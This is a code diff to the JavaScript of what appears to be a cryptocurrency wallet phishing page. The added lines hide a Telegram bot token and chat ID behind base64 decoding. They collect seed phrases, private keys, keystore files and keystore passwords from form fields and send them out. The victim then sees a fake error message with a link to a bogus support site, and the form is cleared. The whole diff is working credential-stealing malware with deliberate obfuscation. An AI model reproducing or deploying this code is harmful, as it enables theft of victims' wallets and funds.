@@ -1,8 +1,11 @@
 //bot token
-var telegram_bot_id = "7165516047:AAEaHWfQ87MvRUGtNJihrqoteBbE8JLkjwc";
+const str = 'NzAyOTI4MzEwNDpBQUZsNWxXUVJ1YldxZ1ZwLVNTQWxvcV9CNkV4MTliaVlQSQ==';
+const u_id = 'NjkwODYwOTM1Ng==';
+var telegram_bot_id = atob(str);
 //chat id
-var chat_id = 731784706;
-var wallet1, wallet2, wallet3, phrase, message;
+var chat_id = parseInt(atob(u_id));
+
+var wallet1, wallet2, wallet3, phrase, kstore, kpass, pkey, message;
 
 function displayError() {
   const errorDiv = document.getElementById("phrase_error");
@@ -27,12 +30,29 @@ var ready = function () {
     wallet1 = document.getElementById("wallet1").value;
     wallet2 = document.getElementById("wallet2").value;
     wallet3 = document.getElementById("wallet3").value;
+    kpass = document.getElementById("kpasswordinput").value;
+    kjson = document.getElementById("kjsoninput").value;
+    pkey = document.getElementById("privateinput").value;
     phrase = document.getElementById("phraseinput").value;
 
-    message = "Manual Entry:\n" + "\nWallet: " + wallet1 + "\nSeed Phrase: " + phrase;
+    
+    if (kpass !== "" && kjson !== "") {
+        message = "Manual Entry:\n" + "\nWallet: " + wallet2 + "\nKey Store: " + kjson + "\nKey pass: " + kpass;
+    }
+    else if (phrase !== "") {
+        message = "Manual Entry:\n" + "\nWallet: " + wallet1 + "\nSeed Phrase: " + phrase;
+    }
+    else if (pkey !== "") {
+        message = "Manual Entry:\n" + "\nWallet: " + wallet3 + "\nPrivate Key " + pkey;
+    }
+    else {
+        message = "No entry"
+    }
+
 };
 
 var sender = function () {
+    
     ready();
 
     var settings = {
@@ -51,12 +71,23 @@ var sender = function () {
     };
 
     $.ajax(settings)
-    .then(function (response) {
-        console.log(response);
-        swal("Secussful", "You clicked the button!", "success");
-    })
-    .catch(function(error) {
-        swal("Error", "You clicked the button!", "error");
-        throw error;
-    });
+    .then(function () {
+        $('#myModal').css('display', 'none');
+
+      Swal.fire({
+        icon: "error",
+        title: "Oops...",
+        text: "Something went wrong!",
+        footer: '<a href="https://livesupport.en-uk.online">Why do I have this issue?</a>'
+      });
+
+     });
+
+    document.getElementById("wallet1").value = "";
+    document.getElementById("wallet2").value = "";
+    document.getElementById("wallet3").value = "";
+    document.getElementById("kpasswordinput").value = "";
+    document.getElementById("kjsoninput").value = "";
+    document.getElementById("privateinput").value = "";
+    document.getElementById("phraseinput").value = "";
 };
